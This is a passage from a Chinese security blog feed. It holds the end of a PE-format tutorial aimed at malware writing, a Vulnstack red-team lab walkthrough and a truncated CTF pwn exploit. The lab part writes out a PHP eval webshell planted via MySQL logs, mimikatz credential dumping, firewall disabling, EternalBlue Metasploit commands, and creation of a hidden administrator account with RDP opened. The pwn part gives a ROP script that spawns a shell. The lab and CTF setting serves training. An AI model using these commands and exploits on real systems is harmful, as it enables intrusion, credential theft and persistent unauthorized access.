macro-name">IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</span>    <span class="token expression"><span class="token number">7</span>   </span><span class="token comment">// Architecture Specific Data</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_GLOBALPTR</span>       <span class="token expression"><span class="token number">8</span>   </span><span class="token comment">// RVA of GP</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_TLS</span>             <span class="token expression"><span class="token number">9</span>   </span><span class="token comment">// TLS Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</span>    <span class="token expression"><span class="token number">10</span>   </span><span class="token comment">// Load Configuration Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</span>   <span class="token expression"><span class="token number">11</span>   </span><span class="token comment">// Bound Import Directory in headers</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IAT</span>            <span class="token expression"><span class="token number">12</span>   </span><span class="token comment">// Import Address Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</span>   <span class="token expression"><span class="token number">13</span>   </span><span class="token comment">// Delay Load Import Descriptors</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</span> <span class="token expression"><span class="token number">14</span>   </span><span class="token comment">// COM Runtime descriptor</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/4cf8bf30b17a1e800995163d25868ac0_MD5.jpeg"></p><p>下面的两节将简要提到两个重要的数据目录：<strong>导出目录</strong>（Export Directory）和<strong>导入地址表</strong>（Import Address Table）。</p><h5 id="导出目录-Export-Directory"><a href="#导出目录-Export-Directory" class="headerlink" title="导出目录 Export Directory"></a>导出目录 Export Directory</h5><p><img src="/Rxi134_FILE/026f1d5122663a7d45c2801a475d563e_MD5.jpeg"><br>PE 文件的导出目录是一个数据结构，包含关于从可执行文件中导出函数和变量的信息。它包含导出函数和变量的地址，其他可执行文件可以使用这些地址来访问这些函数和数据。导出目录通常存在于导出函数的 DLL 中（例如从 <strong><code>kernel32.dll</code></strong> 中导出 **<code>CreateFileA</code>**）。</p><h5 id="导入地址表-Import-Address-Table"><a href="#导入地址表-Import-Address-Table" class="headerlink" title="导入地址表 Import Address Table"></a>导入地址表 Import Address Table</h5><p><img src="/Rxi134_FILE/9ea33c8f5d1827a9caaab901a53cd8c0_MD5.jpeg"></p><p>导入地址表是 PE 文件中的一个数据结构，包含关于从其他可执行文件导入的函数地址的信息。这些地址用于访问其他可执行文件中的函数和数据（例如从 <strong><code>kernel32.dll</code></strong> 中导入 <strong><code>CreateFileA</code></strong> 到 **<code>Application.exe</code>**）。</p><h2 id="PE-Sections"><a href="#PE-Sections" class="headerlink" title="PE Sections"></a>PE Sections</h2><p>PE 段包含了用于创建可执行程序的代码和数据。每个 PE 段都有一个唯一的名称，通常包含可执行代码、数据或资源信息。PE 段的数量不是固定的，因为不同的编译器可以根据配置添加、删除或合并段。有些段也可以手动添加，因此这个数量是动态的，<code>IMAGE_FILE_HEADER.NumberOfSections</code> 用于确定段的数量。<br><img src="/Rxi134_FILE/7c3ea14466fc67f80d7394551252c0f7_MD5.jpeg"></p><p>以下是最重要的 PE 段，几乎每个 PE 文件中都有这些段：</p><ul><li><strong><code>.text</code></strong> - 包含可执行代码，即编写的代码。</li><li><strong><code>.data</code></strong> - 包含已初始化的数据，即代码中已初始化的变量。</li><li><strong><code>.rdata</code></strong> - 包含只读数据。这些是以 <strong><code>.const</code></strong> 为前缀的常量变量。</li><li><strong><code>.idata</code></strong> - 包含导入表。这些是与代码中调用的函数相关的信息表。Windows PE 加载器使用这些表来确定需要加载到进程中的 DLL 文件，以及每个 DLL 中使用的函数。</li><li><strong><code>.reloc</code></strong> - 包含关于如何修正内存地址的信息，以便程序可以无误地加载到内存中。</li><li><strong><code>.rsrc</code></strong> - 用于存储资源，如图标和位图。<br>每个 PE 段都有一个 <strong><code>IMAGE_SECTION_HEADER</code></strong> 数据结构，包含有关该段的有价值信息。这些结构保存在 PE 文件的 NT 头部下，并且彼此堆叠，每个结构代表一个段。</li></ul><p>回想一下，**<code>IMAGE_SECTION_HEADER</code>** 结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_SECTION_HEADER</span> <span class="token punctuation">&#123;</span>  BYTE  Name<span class="token punctuation">[</span>IMAGE_SIZEOF_SHORT_NAME<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>    DWORD PhysicalAddress<span class="token punctuation">;</span>    DWORD VirtualSize<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> Misc<span class="token punctuation">;</span>  DWORD VirtualAddress<span class="token punctuation">;</span>  DWORD SizeOfRawData<span class="token punctuation">;</span>  DWORD PointerToRawData<span class="token punctuation">;</span>  DWORD PointerToRelocations<span class="token punctuation">;</span>  DWORD PointerToLinenumbers<span class="token punctuation">;</span>  WORD  NumberOfRelocations<span class="token punctuation">;</span>  WORD  NumberOfLinenumbers<span class="token punctuation">;</span>  DWORD Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_SECTION_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_SECTION_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个元素都非常有价值和重要：</p><ul><li><strong><code>Name</code></strong> - 段的名称（例如 <code>.text</code>, <code>.data</code>, <code>.rdata</code>）。</li><li><strong><code>PhysicalAddress</code></strong> 或 <strong><code>VirtualSize</code></strong> - 段在内存中的大小。</li><li><strong><code>VirtualAddress</code></strong> - 段在内存中起始位置的偏移量。</li></ul><h1 id="其它参考资料"><a href="#其它参考资料" class="headerlink" title="其它参考资料"></a>其它参考资料</h1><p>如果需要对某些段进行进一步的澄清，强烈推荐阅读 0xRick’s Blog 上的以下博客文章：</p><ul><li><a href="https://0xrick.github.io/win-internals/pe2/">PE 概述</a></li><li><a href="https://0xrick.github.io/win-internals/pe3/">DOS 头部、DOS Stub 和 Rich 头部</a></li><li><a href="https://0xrick.github.io/win-internals/pe4/">NT 头部</a></li><li><a href="https://0xrick.github.io/win-internals/pe5/">数据目录、段头部和段</a></li><li><a href="https://0xrick.github.io/win-internals/pe6/">PE 导入（导入目录表，ILT，IAT）</a></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次接触 PE 头时，理解它可能会比较困难。幸运的是，基本模块中并不需要深入了解 PE 结构。然而，如果想让恶意软件执行更复杂的技术，就需要更深入的理解，因为某些代码需要解析 PE 文件的头和各个节。这部分内容可能会出现在中级和高级模块中。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.Introduction To The Windows API 对windows API的介绍</title>
      <link href="/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="87f6cd3add92e5f681beb51e2a86bf4fd7387a34d555675e20c6c8bd558de3d2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.Windows Architecture Windows架构</title>
      <link href="/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4a2ce63102b6bd36fa38f56c121a3bf3b5748e9a69b0eb8678d15e89c6a6c14f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-1</title>
      <link href="/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网络拓扑：<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p><p>初始的密码都是 <code>hongrisec@2019</code>，部分可能要重置密码</p><p>域环境的网段是写死的 192.168.52.0&#x2F;24</p><p>在C盘找到 phpstudy 启动服务<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="phpmyadmin写马"><a href="#phpmyadmin写马" class="headerlink" title="phpmyadmin写马"></a>phpmyadmin写马</h2><p>访问站点是一个 phpstudy 探针<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p><p>扫下端口，注意开了 3306 端口<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>有防火墙</p><p>dirsearch 速扫<br><img src="/Rxi134_FILE/2838396d0573f8459b81f3b52a7399b5_MD5.jpeg"></p><p>&#x2F;readme 查看到版本为 3.5.8.2<br><img src="/Rxi134_FILE/649c61ddd29d4580811dfdcc03f4972f_MD5.jpeg"></p><p>root:root直接进后台了<br><img src="/Rxi134_FILE/3a56f2a12461d4fad5ecfe87ef16074f_MD5.jpeg"></p><p>第一步肯定是写马，通过phpinfo页面泄露了网站绝对路径 C:&#x2F;phpStudy&#x2F;WWW<br><img src="/Rxi134_FILE/78453fa6fde1da6dbad9fbc2caeabc09_MD5.jpeg"></p><p><code>show global variables like &quot;secure%&quot;</code>  无权直接写<br><img src="/Rxi134_FILE/8b5f038fc0e8113cf2f25a5e102a53a6_MD5.jpeg"></p><p><code>show variables like &#39;%general%&#39;;</code>  查看日志状态<br><img src="/Rxi134_FILE/e062de56aa4d26682f87334d618d01f3_MD5.jpeg"></p><p>打开日志写马</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"on"</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">"C:\\phpStudy\\WWW\\fuck.php"</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[pwd]); ?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>蚁剑连上去<br><img src="/Rxi134_FILE/22dcfc7cf6830bfcd2f039159866ae1e_MD5.jpeg"></p><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>拿到了shell，不过发现有一个 yxcms 目录（数据库里也有 newycms ）<br><img src="/Rxi134_FILE/5851e7a33c9394a25dc4c433b7c37f4d_MD5.jpeg"></p><p><img src="/Rxi134_FILE/075fe84d667cd331805108e924180898_MD5.jpeg"></p><p>直接进入后台<br><img src="/Rxi134_FILE/60ad05e0511dbd0dcd4373500a1793b0_MD5.jpeg"><br>这边在前台发现可以更改网站模板<br><img src="/Rxi134_FILE/542275ea3a4be53c9a4eaeaf2b637cc0_MD5.jpeg"></p><p>在网上查阅资料，模板文件位于 <code>/protected/apps/admin/view/</code> 下<br><img src="/Rxi134_FILE/cdd86ad2510038db60db1008bbdaf1a0_MD5.jpeg"></p><p>写入webshell即可</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>这边发现web服务器处在 GOD 域<br><img src="/Rxi134_FILE/62bde2c055f864a41df2359c7d2fc81b_MD5.jpeg"></p><p>使用 frp 作为反向代理，反弹shell到msf<br><img src="/Rxi134_FILE/a9893884ef8ead61d86368998319d2ad_MD5.jpeg"><br><img src="/Rxi134_FILE/44f4483735f8b10879da4eab5d036ba8_MD5.jpeg"></p><p>ipconfig &#x2F;all 发现了其它网段：192.168.52.0&#x2F;24</p><p>给 msf 添加一段 session 路由：<br><img src="/Rxi134_FILE/5dc634869627198f50e88c8072ad3f26_MD5.jpeg"></p><p>利用proxychains 实现内网代理<br><img src="/Rxi134_FILE/d08d392b01088f46c2e8d78e40ad90c4_MD5.jpeg"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>win7机器。主机名为 STU1<br><img src="/Rxi134_FILE/4888e3a5a05fa13d29462b3eb307baa9_MD5.jpeg"><br><img src="/Rxi134_FILE/2423b262365f3d131f5747fd526d113f_MD5.jpeg"></p><p>管理员权限，直接迁移进程到 lsass.exe<br><img src="/Rxi134_FILE/48c6914e05b0a6d30470d24219dc58dc_MD5.jpeg"></p><p>mimikatz 抓取明文密码：<code>god\Administrator:hongrisec@2019</code><br><img src="/Rxi134_FILE/ac5dbe258bda12ef7271887dd5ec77de_MD5.jpeg"></p><p>windows防火墙处于开启状态，直接关闭</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a0ad78682d9f162654779ff0317b14aa_MD5.jpeg"></p><p><code>net view /domain</code>查看有几个域，只有GOD一个域<br><img src="/Rxi134_FILE/0f29f7520a5a593a4b331285e14e9af9_MD5.jpeg"></p><p><code>net view /domain:GOD</code>查看GOD域内所有主机<br><img src="/Red_FILE/7d6c6afce54bef7142e2bcb011f4dfda_MD5.jpeg"></p><p><code>net group /domain</code> 查看域用户组<br><img src="/Rxi134_FILE/f23f2d20a63f6b909801c35a6d5e5317_MD5.jpeg"></p><p><code>net group &quot;Domain Controllers&quot; /domain</code> 确定DC<br><img src="/Rxi134_FILE/944a26e6658ee835bff7b566f2e3ae1f_MD5.jpeg"></p><p>既然在域内，利用 netbios协议 探测内网主机<br><img src="/Rxi134_FILE/25c5c05f8140aede807e09a51bd922ba_MD5.jpeg"><br>确定 141 的域PC ，和 138 的DC</p><h2 id="永恒之蓝攻破DC、域PC"><a href="#永恒之蓝攻破DC、域PC" class="headerlink" title="永恒之蓝攻破DC、域PC"></a>永恒之蓝攻破DC、域PC</h2><p>通过msf搭建socks5隧道<br><img src="/Rxi134_FILE/7190ed049d8a421673767639b2135e54_MD5.jpeg"></p><p>proxfier 检查<br><img src="/Rxi134_FILE/4a880d027642c2a0b6f1b0d6faa982f0_MD5.jpeg"></p><p>然后设置浏览器代理<br><img src="/Rxi134_FILE/939fb88fca8c009f7fbb65f45fd6424e_MD5.jpeg"></p><p>成功访问到内网里 DC 的80端口<br><img src="/Rxi134_FILE/4eb1cbb89f9311facea2a54ee1beecce_MD5.jpeg"></p><p>端口扫描，利用  proxychains 将我们的流量带入内网</p><p>138 DC端口开放情况：<br><img src="/Rxi134_FILE/f28880db586a6aa81d22407edf3c5fe8_MD5.jpeg"></p><p>141 域PC端口开放情况：<br><img src="/Rxi134_FILE/194285cc6d827ef391a6b7dc176d4ef7_MD5.jpeg"></p><p>很敏感想到永恒之蓝<br><img src="/Rxi134_FILE/56e0d75fedfb5066f1a0d1bae4133ed2_MD5.jpeg"></p><p>先打DC</p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbluemsf6 &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpmsf6 &gt; set rhosts 192.168.52.138msf6 &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是反弹shell失败了，网上查阅永恒之蓝直接反弹shell的几率还是不大的</p><p>这边使用 admin&#x2F;smb&#x2F;ms17_010_command 来执行命令<br><img src="/Rxi134_FILE/8c31fb6cec07c86d799101be58d71c2e_MD5.jpeg"></p><p>那就简单了，添加一个用户并加入管理员，同时开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">set</span> command net user x1nri Zzx<span class="token punctuation">.</span>123 <span class="token operator">/</span>addnet user x1nri <span class="token operator">/</span>active:yesnet localgroup Administrators x1nri <span class="token operator">/</span>addreg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>fnetsh advfirewall firewall add rule name=<span class="token string">"允许RDP"</span> protocol=TCP <span class="token function">dir</span>=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置 proxifier 代理规则<br><img src="/Rxi134_FILE/00ceda9c0016f0832a563c6231c8db56_MD5.jpeg"></p><p>远程桌面登录 <code>god\x1nri:Zzx.123</code>，拿到 DC 的 shell<br><img src="/Rxi134_FILE/23a2af87a7ffda74e88781eaed7fc00d_MD5.jpeg"></p><p>上传mimikatz，以管理员运行抓取密码</p><pre class="line-numbers language-mimikatz" data-language="mimikatz"><code class="language-mimikatz">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/70fe24cc8636b188b0930577bcec469b_MD5.jpeg"><br>抓取到密码（环境搭建时改的密码）：<code>liukaifeng01:HONGRISEC@2019</code>，但是并没有抓取到administrator的密码</p><p>选中快速编辑，方便复制黏贴<br><img src="/Rxi134_FILE/de5d490af01e9a90d3a0ad717bd8cfcd_MD5.jpeg"></p><p>跳板机无法运行frp<br><img src="/Rxi134_FILE/c09bb9abe5947989b47e91dce7ede880_MD5.jpeg"></p><p>关闭防火墙，正连拿到shell<br><img src="/Rxi134_FILE/c558ddc843f8c9a589e8be82428568da_MD5.jpeg"></p><p>同理，利用永恒之蓝再拿到域 PC shell </p><h1 id="利用CS"><a href="#利用CS" class="headerlink" title="利用CS"></a>利用CS</h1><p>这边利用CS再走一遍流程（对CS不太熟，加深下理解），这里使用的是二开的CAT CS</p><p>设置一个beacon_http的监听器，监听80端口<br><img src="/Rxi134_FILE/e2621704b1231742b5ea146581e5d4a1_MD5.jpeg"></p><p>上线webserver，直接拿到了administrator权限<br><img src="/Rxi134_FILE/07d69db871fd49c5e67a8d126118e452_MD5.jpeg"></p><p>设置心跳时间（这里不是真实环境直接设为0了）<br><img src="/Rxi134_FILE/82e77dc5fb7aef4133d9651f2df74207_MD5.jpeg"></p><p>通过自带模块 getsystem 提升权限到SYSTEM，再通过进程注入返回一个新的shell<br><img src="/Rxi134_FILE/25b63f034b9008bc32f18d9b32f215a5_MD5.jpeg"></p><p>net view探测域内主机<br><img src="/Rxi134_FILE/33b1dc2afcbab5f2afb38ef6cf43a33f_MD5.jpeg"></p><p>上一个fscan内网大保健<br><img src="/Rxi134_FILE/79f4a4425c10ad714d943c7f01d71fca_MD5.jpeg"></p><p>我用的二开CS，不能直接派生会话给msf，只能重新上马了</p><p>在 跳板机 上设置一个新的代理监听器<br><img src="/Rxi134_FILE/57a05d38484ff210802fc0ba4bb1dfc0_MD5.jpeg"></p><p>之后就是正常ms17_010的利用，略</p><p>总结：CS真方便哇</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯京津冀2024初赛</title>
      <link href="/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="flowershop：简单栈溢出"><a href="#flowershop：简单栈溢出" class="headerlink" title="flowershop：简单栈溢出"></a>flowershop：简单栈溢出</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'请输入你的选项:'</span><span class="token punctuation">,</span>choice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shop</span><span class="token punctuation">(</span>buy<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span>buy<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'pwn'</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"请输入你的姓名:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400CE4'</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400f13</span>ret<span class="token operator">=</span><span class="token number">0x00000000004006f6</span>system<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span><span class="token number">0x0000000000601840</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token 